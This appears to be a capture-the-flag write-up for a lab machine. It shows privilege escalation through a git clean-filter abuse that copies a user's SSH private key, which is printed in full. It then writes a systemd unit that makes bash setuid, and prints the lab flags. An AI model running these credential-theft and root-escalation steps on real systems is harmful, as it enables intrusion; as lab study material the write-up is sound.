User www-data may run the following commands on encoding:
    (svc) NOPASSWD: /var/www/image/scripts/git-commit.sh
www-data@encoding:~/image/actions$ cat /var/www/image/scripts/git-commit.sh

cat /var/www/image/scripts/git-commit.sh

#!/bin/bash

u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)

if [[ $u ]]; then
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
else
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m "Commited from API!" --author="james <james@haxtables.htb>"  --no-verify
fi
```

- The `echo '*.php filter=indent' > .git/info/attributes` command sets up a Git repository in the `/var/www/image` directory, and adds a `filter` attribute for files ending with `.php` in the `.git/info/attributes` file. This `filter` attribute is set to use the `indent` script, which will be executed on files when they are committed to the repository.
- When the `git-commit.sh` script is run with `sudo -u svc /var/www/image/scripts/git-commit.sh`, it checks for any new files in the working directory (`/var/www/image`) that are not already tracked by Git. If any new files are found, the script runs `git add -A` to add all new and modified files to the Git staging area. Since the `filter` attribute is set for files ending in `.php`, the `indent` script is executed on all `.php` files before they are added to the Git staging area.
- Since the `indent` script is set to execute `/tmp/readkey`, and the output of `/tmp/readkey` is redirected to `/dev/shm/key`, the private key will be output to `/dev/shm/key` every time a `.php` file is committed to the repository. Therefore, the private key will be available at `/dev/shm/key` for anyone with read permissions on the system.

```bash
echo "cat ~/.ssh/id_rsa > /dev/shm/key" > /tmp/readkey
chmod +x /tmp/readkey

cd /var/www/image
git init
echo '*.php filter=indent' > .git/info/attributes
git config filter.indent.clean /tmp/readkey
sudo -u svc /var/www/image/scripts/git-commit.sh
ls /dev/shm
cat /dev/shm/key
```

```bash
vim encoding_svc_id_rsa
chmod 700 encoding_svc_id_rsa
ssh -i encoding_svc_id_rsa svc@encoding.htb 
```

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

- User `svc` has permissions to restart any service
```bash
sudo -l

Matching Defaults entries for svc on encoding:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on encoding:
    (root) NOPASSWD: /usr/bin/systemctl restart *
```

- We can create a service in which we can execute to give us root access
```bash
echo -e "[Service]\nType=oneshot\nExecStart=chmod u+s /bin/bash\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/1up.service

sudo systemctl restart 1up

/bin/bash -p
```


```bash
bash-5.1# cat user.txt

51ff2ee7efd2ef60496bd3575e130d92

bash-5.1# cat /root/root.txt

8cf91fd4df10b57efe622e901ca2afc1
```

#hacking
